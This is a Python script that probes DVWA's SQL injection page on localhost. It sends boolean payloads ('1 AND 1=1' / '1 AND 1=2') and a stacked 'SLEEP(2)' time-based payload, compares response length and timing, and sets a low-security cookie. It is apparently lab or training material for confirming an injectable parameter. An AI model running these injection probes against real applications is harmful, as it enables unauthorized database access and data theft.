#!/usr/bin/env python3
"""
Verify SQL injection actually reaches the sink with oracle tests
"""
import time
import requests
import sys
from typing import Tuple

def oracle_test(base_url: str, endpoint: str) -> None:
    """Test boolean and time-based SQL injection oracles"""
    
    print("=== Step 3: SQL Oracle Verification ===\n")
    
    # Test endpoint with session (assuming DVWA security=low after login)
    session = requests.Session()
    
    # Set security=low via cookie fallback
    session.cookies.set("security", "low", domain="localhost")
    session.cookies.set("PHPSESSID", "test", domain="localhost")
    
    # Test 1: Baseline
    print("Testing baseline query...")
    t0 = time.time()
    try:
        r0 = session.get(f"{base_url}{endpoint}?id=1&Submit=Submit", 
                         allow_redirects=False, timeout=10)
        baseline_time = int((time.time() - t0) * 1000)
        baseline_len = len(r0.content)
        print(f"✅ Baseline: status={r0.status_code} time={baseline_time}ms len={baseline_len}")
    except Exception as e:
        print(f"❌ Baseline test failed: {e}")
        return
    
    # Test 2: Boolean-based (should change content length)
    print("\nTesting boolean oracle...")
    try:
        t1 = time.time()
        r1 = session.get(f"{base_url}{endpoint}?id=1 AND 1=1&Submit=Submit",
                         allow_redirects=False, timeout=10)
        bool_true_time = int((time.time() - t1) * 1000)
        bool_true_len = len(r1.content)
        
        t2 = time.time()
        r2 = session.get(f"{base_url}{endpoint}?id=1 AND 1=2&Submit=Submit",
                         allow_redirects=False, timeout=10)
        bool_false_time = int((time.time() - t2) * 1000)
        bool_false_len = len(r2.content)
        
        print(f"  True:  status={r1.status_code} time={bool_true_time}ms len={bool_true_len}")
        print(f"  False: status={r2.status_code} time={bool_false_time}ms len={bool_false_len}")
        print(f"  Length diff: {abs(bool_true_len - bool_false_len)} bytes")
        
        if abs(bool_true_len - bool_false_len) > 10:
            print("  ✅ Boolean oracle WORKS - SQL reaches sink")
        else:
            print("  ❌ Boolean oracle FAILS - SQL may not reach sink or query sanitized")
    except Exception as e:
        print(f"  ❌ Boolean test failed: {e}")
    
    # Test 3: Time-based
    print("\nTesting time-based oracle...")
    payload_sleep = "1';SELECT SLEEP(2);-- -"
    try:
        t3 = time.time()
        r3 = session.get(f"{base_url}{endpoint}?id={payload_sleep}&Submit=Submit",
                         allow_redirects=False, timeout=15)
        sleep_time = int((time.time() - t3) * 1000)
        
        print(f"  Status: {r3.status_code} Time: {sleep_time}ms")
        
        if sleep_time > 1800:  # Should be ~2000ms
            print(f"  ✅ Time oracle WORKS - delay detected (+{sleep_time - baseline_time}ms)")
        else:
            print(f"  ❌ Time oracle FAILS - no significant delay (got {sleep_time}ms, expected >1800ms)")
    except Exception as e:
        print(f"  ❌ Time test failed: {e}")
    
    print("\n" + "="*60)
    print("Note: If oracles fail, the endpoint may be:")
    print("  - Not vulnerable to SQL injection")
    print("  - Using parameterized queries")
    print("  - Blocking at application level")
    print("  - Requiring authentication/session")

if __name__ == "__main__":
    BASE = "http://localhost:8080"
    ENDPOINT = "/vulnerabilities/sqli/"
    
    try:
        oracle_test(BASE, ENDPOINT)
    except Exception as e:
        print(f"Error during oracle test: {e}")
        print("\n⚠️  Make sure:")
        print("  1. DVWA is running")
        print("  2. You are logged in with security=low")
        print("  3. The endpoint /vulnerabilities/sqli/ exists")
        sys.exit(1)
